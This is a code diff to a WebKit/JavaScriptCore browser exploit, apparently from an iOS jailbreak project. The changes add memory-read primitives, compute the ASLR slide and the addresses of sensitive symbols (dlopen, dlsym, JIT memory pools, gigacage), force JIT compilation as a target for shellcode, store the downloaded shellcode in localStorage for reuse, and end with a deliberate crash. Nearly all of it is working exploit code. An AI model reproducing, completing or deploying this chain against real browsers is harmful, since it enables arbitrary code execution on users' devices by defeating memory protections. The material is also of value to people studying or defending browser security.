@@ -45,6 +45,16 @@ var BASE32 = 0x100000000;
 var workbuf = new ArrayBuffer(0x1000000)
 var u32_buffer = new Uint32Array(workbuf);
 var u8_buffer = new Uint8Array(workbuf);
+function xor(a, b) {
+    var res = 0, base = 1;
+    for(var i = 0; i < 64; ++i) {
+        res += base * ((a&1) ^(b&1));
+        a = (a-(a&1))/2;
+        b = (b-(b&1))/2;
+        base *= 2;
+    }
+    return res;
+}
 function x2a(hex)
 {
     var bytes = new Uint8Array(Math.ceil(hex.length / 2));
@@ -311,7 +321,68 @@ BinHelper.prototype.f64Xor = function (f1, f2) {
 
     return this.toF64(hi1 ^ hi2, lo1 ^ lo2);
 };
+
 var bh = new BinHelper();
+
+var persistantwriter = function() {
+    this.log = '';
+    this.supported = function(){
+        if(window.location.href.split('file://').length == 1) { //we check if the url does not contain file:// (1 = not contains, 2 = contains) this because localStorage is prohibited in local files
+            if(localStorage){ //check if the browser supports localstorage
+                return true;
+            }
+        }
+        return false;
+    }();
+};
+persistantwriter.prototype.read = function()
+{
+    if(this.supported) {
+        this.log = localStorage.getItem('log') || ''; //try to read the last log from localstorage
+    }
+    return this.log;
+};
+persistantwriter.prototype.write = function(msg = '')
+{
+    var newline = '<br>'; //memory efficiency, as it's referenced instead of seperately allocated
+
+    this.read(); //update log with old log
+
+    this.log += Date.now()+":"+newline+msg+newline+newline; //write new log line
+
+    if(this.supported) {
+        localStorage.setItem('log', this.log); //save new log into persistancy
+    }
+
+};
+
+persistantwriter.prototype.readfrom = function(key = '')
+{
+    if(this.supported){
+        return localStorage.getItem(key);
+    }
+};
+
+persistantwriter.prototype.writeto = function(key = '', value = null)
+{
+    if(this.supported){
+        localStorage.setItem(key, value);
+    }
+};
+
+persistantwriter.prototype.clear = function()
+{
+    this.log = '';
+    if(this.supported) localStorage.clear();
+};
+
+persistantwriter.prototype.clearAt = function(key = '')
+{
+    if(this.supported) localStorage.setItem(key, undefined);
+};
+
+
+var pwr = new persistantwriter();
 
 var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10; //Check for spectre mitigations
 var STRUCT_ID = 0x800;
@@ -319,6 +390,9 @@ var ZONE = 0x2F;
 var ZONE_SPAM = 0x40;
 
 var b2hex = function(v){ return '0x'+parseInt(v).toString(16); };
+
+
+
 var stage1 = function (boxed, unboxed, idx) {
     this.boxed   = boxed;
     this.unboxed = unboxed;
@@ -374,6 +448,29 @@ stage1.prototype.read64 = function(a) {
     this.master[1] = this.slaveBfly;
     return ret;
 };
+stage1.prototype.read8 = function(a){
+    let r32hex = f2i(this.read64(a)).toString(16);
+    let byte8str = r32hex.slice(0,8);
+    return parseInt('0x'+byte8str);
+};
+stage1.prototype.read4 = function(a){
+    let r32hex = f2i(this.read64(a)).toString(16);
+    let byte4str = r32hex.slice(0,4);
+    return parseInt('0x'+byte4str);
+};
+stage1.prototype.read2 = function(a){
+    let r32hex = f2i(this.read64(a)).toString(16);
+    let byte2str = r32hex.slice(0,2);
+    return parseInt('0x'+byte2str);
+};
+
+stage1.prototype.read = function(addr, length) {
+    var a = new Uint8Array(length*2);
+    for(i = 0; i < length; i+=2){
+        a.push(this.read2(addr+i));
+    }
+    return new TextDecoder().decode(a);
+};
 stage1.prototype.remaster = function() {
     let unboxed = [];
     unboxed[0] = 1.1;
@@ -396,23 +493,10 @@ stage1.prototype.test = function() {
     return x1 === 2.2;
 };
 
-var persistantwriter = function(){};
-persistantwriter.write = function(msg){
-    var log = localStorage.getItem('log');
-    if(!log) log = '';
-    log += Date.now()+":<br>"+msg+'<br><br>';
-    localStorage.setItem('log', log);
-};
-persistantwriter.read = function(){
-    var log = (localStorage.getItem('log') || false);
-    return log;
-};
-persistantwriter.clear = function(){localStorage.clear();};
-
 print = function(msg, popup = false) {
-    persistantwriter.write(msg+'\n');
+    pwr.write(msg+'\n');
     if(popup) alert(msg);
-    puts(msg);
+    puts(msg.replace(/\n/g, "<br>"));
 };
 
 function __gc() {
@@ -447,6 +531,30 @@ function foo(tmp, refill) {
     return result;
 }
 _off = {};
+
+function makeJITCompiledFunction() {
+    // Some code to avoid inlining...
+    function target(num) {
+        for (var i = 2; i < num; i++) {
+            if (num % i === 0) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    // Force JIT compilation.
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    return target;
+}
 
 var pwn = function(){
     print("Triggering garbage collector");
@@ -543,7 +651,7 @@ var pwn = function(){
         // we place (0x4141,i) touples, so later on
         // we can detect which butterfly was placed after our
         // butterfly with out of bound read/write
-        a[0] = bh.toF64(0x4141, i);
+        a[0] = bh.toF64(0x4141, i); //will generally end up in X14
         arrs[i] = a;
     }
 
@@ -609,7 +717,7 @@ var pwn = function(){
 
     // Read some vtables, you should be able to see
     // authenticated pointer if you are on XS.
-    var wrapper = document.createElement('div')
+    var wrapper = document.createElement('div');
     var el = rw.read64AtObj(wrapper, FPO);
     print("element is at 0x" + bh.f64ToStr(el));
 
@@ -621,9 +729,11 @@ var pwn = function(){
     print("element function is at 0x" + bh.f64ToStr(fn));
 
     let inst = rw.read64(fn);
-    print("element instance is " + x2a(bh.f64ToStr(inst)));
+    print("executable instance is " + x2a(bh.f64ToStr(inst)));
 
+    if(!_off.vtable) print('Can\'t determine ASLR slide without a vtable offset. Continuing anyway');
     var slide =  parseInt('0x'+bh.f64ToStr(vtable)) - _off.vtable;
+
     var disablePrimitiveGigacage = _off.disableprimitivegigacage + slide;
     var callbacks = _off.callbacks + slide;
     var g_gigacageBasePtrs =  _off.g_gigacagebaseptrs + slide;
@@ -631,34 +741,70 @@ var pwn = function(){
     var dlsym = _off.dlsym + slide;
     var ptr_stack_check_guard = _off.ptr_stack_check_guard + slide;
     var linkcode_gadget = _off.linkcode_gadget + slide;
-
-    // var startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide);
-    // var endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide);
-    // var jitWriteSeparateHeapsFunction = rw.read64(_off.jit_writeseperateheaps_func + slide);
-    // var useFastPermisionsJITCopy = rw.read64(_off.usefastpermissions_jitcopy + slide);
-    // var pop_x8 = _off.modelio_popx8 + slide;
-    // var pop_x2 = _off.coreaudio_popx2 + slide;
-    // var callback_vector = stage2.read64(callbacks);
-   //  var poison = stage2.read64(g_typedArrayPoisons + 6*8);
+    var jscbase = _off.jscbase + slide;
+    var jit_writeseperateheaps_func = _off.jit_writeseperateheaps_func + slide;
+    var usefastpermissions_jitcopy = _off.usefastpermissions_jitcopy + slide;
+    var startfixedmempool = _off.startfixedmempool + slide;
+    var endfixedmempool = _off.endfixedmempool + slide;
+    var dlopen = _off.dlopen + slide;
+    var confstr = _off.confstr + slide;
 
     print(''
         + '\nASLR Slide ' + b2hex(slide) //dyld shared cache slide should be equal to the vtable infoleak minus the vtable offset
-        + '\ncallbacks @ ' + b2hex(callbacks) //callback vector
-        + '\nlongjmp @ ' + b2hex(longjmp) //symbol
-        + '\ndlsym @ ' + b2hex(dlsym) //dlsym symbol, used for referincing a symbol by string
-        + '\ndisablePrimitiveGigacage @ ' + b2hex(disablePrimitiveGigacage) //symbol
-        + '\ng_gigacageBasePtrs @ ' + b2hex(g_gigacageBasePtrs) //symbol
-        //  + '\njitWriteSeparateHeapsFunction @ ' + b2hex(jitWriteSeparateHeapsFunction) //not yet implemented because r/w sucks
-        //  + '\nuseFastPermisionsJITCopy @ ' + b2hex(useFastPermisionsJITCopy) //not yet implemented because r/w sucks
-        + '\nlinkCode gadget @ ' + b2hex(linkcode_gadget) //symbol, used in stage2
+        + '\nJavaScriptCore base @ ' + (jscbase == slide ? "Offset missing" : b2hex(jscbase))
+        + '\ncallbacks @ ' + (callbacks == slide ? "Offset missing" : b2hex(callbacks)) //callback vector
+        + '\nlongjmp @ ' + (longjmp == slide ? "Offset missing" : b2hex(longjmp)) //symbol
+        + '\ndlopen @ ' + (dlopen == slide ? "Offset missing" : b2hex(dlopen))
+        + '\ndlsym @ ' + (dlsym == slide ? "Offset missing" : b2hex(dlsym)) //dlsym symbol, used for referincing a symbol by string
+        + '\nconfstr @ ' + (confstr == slide ? "Offset missing" : b2hex(confstr))
+        + '\ndisablePrimitiveGigacage @ ' + (disablePrimitiveGigacage == slide ? "Offset missing" : b2hex(disablePrimitiveGigacage)) //symbol
+        + '\ng_gigacageBasePtrs @ ' + (g_gigacageBasePtrs == slide ? "Offset missing" : b2hex(g_gigacageBasePtrs)) //symbol
+        + '\nlinkCode gadget @ ' + (linkcode_gadget == slide ? "Offset missing" : b2hex(linkcode_gadget)) //symbol, used in stage2
+        + '\njit_writeseperateheaps_func @ ' + (jit_writeseperateheaps_func == slide ? "Offset missing" : b2hex(jit_writeseperateheaps_func))
+        + '\nuseFastPermisionsJITCopy @ ' +  (usefastpermissions_jitcopy == slide ? "Offset missing" : b2hex(usefastpermissions_jitcopy))
+        + '\nstartfixedmempool @ ' + (startfixedmempool == slide ? "Offset missing" : b2hex(startfixedmempool))
+        + '\nendfixedmempool @ ' + (endfixedmempool == slide ? "Offset missing" : b2hex(endfixedmempool))
+        + '\nptr_stack_check_guard @ ' + (ptr_stack_check_guard == slide ? "Offset missing" : b2hex(ptr_stack_check_guard))
+        + '\nDo we use usefastpermissions_jitcopy? '+(rw.read64(i2f(usefastpermissions_jitcopy)) ? "yes" : "no")
+        + '\nDo we use jit_writeseperateheaps_func? '+(rw.read64(i2f(jit_writeseperateheaps_func)) ? "yes" : "no")
+    , true);
+
+    var callback_vector = rw.read64(i2f(callbacks));
+
+    print(''
+        + '\nCallback vector: 0x'+bh.f64ToStr(callback_vector)
     ,true);
 
-    alert("Thats as far as I can get rightnow, please don't push me, only push changes.");
+    var poison_addr = jscbase + 305152; //might be incorrect, just check it
+    var poison = rw.read64(i2f(poison_addr));
+    print(''
+        + '\nPoison: 0x'+bh.f64ToStr(poison)
+    ,true);
+    var func = makeJITCompiledFunction();
+    var funcAddr = rw.addrof(func);
+    var execAddr = rw.read8(funcAddr);
+   // var jitcodeaddr = rw.read8(execAddr);
+    //var codeAddrPoisoned = rw.read8(jitcodeaddr + 8);
+    //var codeAddr = bh.f64Xor(execAddr, poison);
+    //rw.write(codeAddr, _shellcode);
+    // var res = func(); //run shellcode
+    print(''
+        + '\nJIT Compiled function at: 0x'+bh.f64ToStr(funcAddr)
+        + '\nExecutable code at: 0x'+execAddr.toString(16)
+        //+ '\nJIT Code at: 0x'+bh.f64ToStr(codeAddr)
+    , true);
+     //alert("Writing shellcode");
+   // alert("Shellcode is at: "+i2f(rw.read(_shellcode)));
 
+    //rw.write(codeaddr, _shellcode);
+   // func();
+   
+    print("Thats as far as I can get rightnow, please don't push me, only push changes.",true);
+    print("We'll now crash register x17 to 0x41414141414141",true);
+    rw.read64(i2f(0x41414141414141));
    // wrapper.addEventListener('click', function(){});
     // to get code execution refer to [1] for iPhones up to XS, 
     // XS models will require a different approach ...
-    foo = undefined;
     // Die, since we have fake object still referenced by the foo function,
     // so the garbage collection is going to try to walk
     // it causing a crash. There might be some other reasons as well ...
@@ -704,14 +850,14 @@ function check_integrity(buffer){
 
 var wk1201go = function()
 {
-    (persistantwriter.read() || print("No previous logs, probably first time jailbreaking!"));
-    persistantwriter.clear();
+    if(pwr.read().length == 0) print("No previous logs, probably first time jailbreaking!");
+    pwr.clearAt('log');
     if(!window.chosendevice.offsets) print("For some reasons offsets are missing, continuing anyway...");
     _off = window.chosendevice.offsets;
 
     print("Exploit has been called and is awaiting shellcode.");
     
-    this.callback = function(buffer){
+    this.callback = function(buffer, local=false){
         try 
         {
             
@@ -721,7 +867,8 @@ var wk1201go = function()
             
             var shellcode_length = buffer.byteLength;
             if(shellcode_length > CONFIG.PAYLOAD.MAX_SIZE) throw "Shellcode exceeds maximum size";
-            print("Received "+shellcode_length+" bytes of shellcode.");
+            print("Received "+shellcode_length+" bytes of shellcode "+ (local ? "from persistent storage." : "."), true);
+            if(!local) pwr.writeto('shellcode',new TextDecoder().decode(buffer));
            // check_integrity(buffer);
             return pwn();
         } 
@@ -730,5 +877,10 @@ var wk1201go = function()
             print(ex);
         }
     };
-    FileStorage.getcontents(FileStorage.mode.FETCH, 'testmacho', this.callback);
+    if(pwr.readfrom('shellcode')) {
+        print("We got some shellcode in the persistent storage, no need to download.");
+        this.callback(new TextEncoder().encode(pwr.readfrom('shellcode')).buffer, true); //read shellcode from persistent storage and encode it into an arraybuffer
+    } else {
+        FileStorage.getcontents(FileStorage.mode.FETCH, 'testmacho', this.callback);
+    }
 };
